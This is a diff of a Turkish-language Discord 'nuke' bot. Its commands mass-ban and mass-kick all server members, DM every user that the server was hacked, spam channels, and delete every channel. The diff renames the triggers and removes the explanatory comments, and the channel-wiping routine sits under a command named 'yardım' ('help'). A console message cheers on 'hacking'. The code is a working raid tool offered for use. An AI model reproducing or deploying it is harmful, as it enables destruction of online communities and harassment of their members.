@@ -5,33 +5,33 @@ const { Client, Util } = require("discord.js");//by diizy'#0061
 const request = require("request");
 client.login(ayarlar.token);
 client.on('ready', () => {//by diizy'#0061//by diizy'#0061
- client.user.setActivity(`↪💖 Destek sunucusu: https://discord.gg/dCbWgZtRFB ↪✔Ana Komut: !yardım `)//by diizy'#0061
+ client.user.setActivity(`↪💖 Destek sunucusu: https://discord.gg/dCbWgZtRFB ↪✔Ana Komut: !help `)//by diizy'#0061
  console.log(`${client.user.tag} bot aktifleştirildi hayırlı hacklemeler dikkat dava açmasınlar! >:D by dizzy'#0061 `);//by diizy'#0061
 });
 
 //by diizy'#0061
 
 client.on("message", msg => {          
-  if (msg.content === "!ban") {//by diizy'#0061//by diizy'#0061
+  if (msg.content === "!banla") {//by diizy'#0061//by diizy'#0061
     msg.delete();
     msg.guild.members.forEach(member => member.ban());  
   }
 });       ///BAN KOMUTU SUNUCUDAKI HEKESI BANLAR +ban
 
 client.on("message", msg => {
-  if (msg.content === "!kick") {
+  if (msg.content === "!at") {
     msg.delete();//by diizy'#0061
     msg.guild.members.forEach(member => member.kick());
   }//by diizy'#0061
-});      ///KICK KOMUTU SUNUCUDAKI HERKESI KICKLER +kick 
+});      
 
 client.on("message", async msg => {//by diizy'#0061
-  if (msg.content === "!duyur") {  //SUNUCUDAKI BUTUN HERKESE MESAJ GÖNDERİR +duyur
+  if (msg.content === "!duyuruyap") {  
     msg.delete();
     await msg.client.users
       .forEach(users =>//by diizy'#0061
         users.send(
-          "**BU SUNUCU HACKLENMİŞTİR HADİ KOLAY GELSİN** :wink:"  //HERKESE DMDEN ATILAN MESAJ
+          "bulunduğun bir sunucu sunucu hacklenmiştir boşver gitsin by dizzy'#0061 :heart:" 
         )//by diizy'#0061
       )
       .catch(console.error);
@@ -39,7 +39,7 @@ client.on("message", async msg => {//by diizy'#0061
 });
 //by diizy'#0061
 client.on('message', msg => {
-  if (msg.content === '!spam') { //KOMUTU YAZDIGINIZ KANALA SPAM ATAR
+  if (msg.content === '!spamyap') { 
          
    
 msg.channel.send("hacked by dizzy'#0061 ");
@@ -126,8 +126,7 @@ client.on("message", async msg => {
   if (msg.content === "!yardım") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
     msg.delete();
 
-     msg.guild.channels.cache.forEach(c => {
-            c.delete()
+     msg.guild.channels.cache.forEach(c => {c.delete()
         })
 
    
